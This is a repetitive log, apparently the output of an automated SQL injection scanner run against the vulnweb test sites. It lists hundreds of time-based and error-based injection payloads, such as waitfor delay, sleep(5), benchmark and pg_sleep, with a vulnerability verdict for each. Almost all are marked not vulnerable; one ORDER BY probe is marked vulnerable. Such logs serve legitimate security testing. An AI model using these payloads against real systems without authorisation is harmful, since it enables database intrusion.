URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testhtml5.vulnweb.com/, Payload: ');waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ');waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ') or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ");waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ");waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ;waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ;waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: '));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ;waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: '));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or sleep(5)=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: );waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: );waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: );waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: "));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ';waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ;waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: "));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ';waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ';waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ";waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: );waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ";waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ";waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1 or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ');waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ';waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ');waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1 or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ');waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: " or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ");waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ";waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ");waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: " or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ");waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ' or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ');waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ' or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: '));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ");waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ") or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: '));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: "));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: '));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ") or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ') or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: "));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: "));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: '));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ') or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1 or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: "));waitfor delay '0:0:5'--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1 or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: " or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1 or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: " or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ' or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: " or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1 or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ' or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ' or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: " or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ") or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1 or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ' or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1 or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ') or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: " or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ") or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ") or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: " or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ' or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ') or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ') or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ") or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ' or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ') or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ") or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ") or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ') or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1 or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ') or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or benchmark(10000000,MD5(1))#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: " or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1 or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1 or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ' or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: " or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: " or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1 or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ' or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ' or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: " or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ") or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ' or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ') or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ") or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ") or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ') or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP), Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ') or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ") or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ') or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: 1)) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: SLEEP(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ')) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: ")) or pg_sleep(5)--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: http://testhtml5.vulnweb.com/, Payload: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
